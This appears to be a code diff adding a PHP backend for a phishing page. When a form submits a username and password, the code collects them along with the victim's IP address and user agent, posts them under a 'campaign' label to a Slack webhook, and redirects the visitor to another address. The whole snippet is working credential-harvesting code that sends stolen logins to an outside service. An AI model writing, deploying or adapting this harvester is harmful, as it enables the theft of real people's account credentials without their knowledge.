@@ -1,0 +1,35 @@
+
+function get_client_ip() {
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else
+        $ipaddress = 'UNKNOWN';
+    return $ipaddress;
+}
+
+if (isset($_REQUEST['username']) && isset($_REQUEST['password']))
+{
+    $text = "$title\n\n";
+    $text .= "campaign : ".$campaign."\n";
+    $text .= "username : ".$_REQUEST['username']."\n";
+    $text .= "password : ".$_REQUEST['password']."\n";
+    $text .= "ip : ".get_client_ip()."\n";
+    $text .= "UA : ".$_SERVER['HTTP_USER_AGENT']."\n";
+
+    slack_notify($title, $text, $slack_webhook);
+
+    header("Location: $redirect");
+    exit();
+}
+
